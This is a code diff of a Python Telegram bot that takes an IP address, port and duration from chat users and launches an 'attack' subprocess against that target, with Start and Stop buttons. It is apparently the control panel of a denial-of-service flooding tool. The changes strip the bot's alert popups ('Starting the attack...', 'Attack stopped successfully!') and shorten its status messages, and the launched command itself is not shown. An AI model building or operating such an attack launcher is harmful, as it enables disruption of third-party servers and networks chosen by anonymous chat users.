@@ -18,7 +18,7 @@ async def handle_ip_port(event):
 
     # Send initial message with buttons
     message = await event.respond(
-        f"Received IP: {ip}, Port: {port}, Duration: {duration}\nChoose an action:",
+        f"{ip} {port}\nStatus: ",
         buttons=[
             [Button.inline("Start", data=f"start|{ip}|{port}|{duration}")]
         ]
@@ -33,11 +33,9 @@ async def handle_buttons(event):
 
     if action == b"start":
         if (chat_id, ip, port) in running_processes:
-            await event.answer("Attack is already running!", alert=True)
             return
 
         duration = int(duration.decode()) if duration else 60
-        await event.answer("Starting the attack...", alert=True)
 
         # Run attack and update message with status
         process = await asyncio.create_subprocess_shell(
@@ -50,7 +48,7 @@ async def handle_buttons(event):
 
         # Update message with attack status and replace button with 'Stop'
         if message_id:
-            await client.edit_message(chat_id, message_id, f"{ip.decode()}:{port.decode()}\nStatus: Attack ongoing", buttons=[
+            await client.edit_message(chat_id, message_id, f"{ip.decode()} {port.decode()}\nStatus: Attack ongoing", buttons=[
                 [Button.inline("Stop", data=f"stop|{ip.decode()}|{port.decode()}")]
             ])
 
@@ -58,15 +56,14 @@ async def handle_buttons(event):
         process = running_processes.pop((chat_id, ip, port), None)
         if process:
             process.terminate()
-            await event.answer("Attack stopped successfully!", alert=True)
 
             # Update message with attack status and replace button with 'Start'
             if message_id:
-                await client.edit_message(chat_id, message_id, f"{ip.decode()}:{port.decode()}\nStatus: Attack stopped", buttons=[
+                await client.edit_message(chat_id, message_id, f"{ip.decode()} {port.decode()}\nStatus: Attack stopped", buttons=[
                     [Button.inline("Start", data=f"start|{ip.decode()}|{port.decode()}|60")]
                 ])
         else:
-            await event.answer("No running attack to stop!", alert=True)
+            return
 
 async def monitor_process(chat_id, process):
     stdout, stderr = await process.communicate()
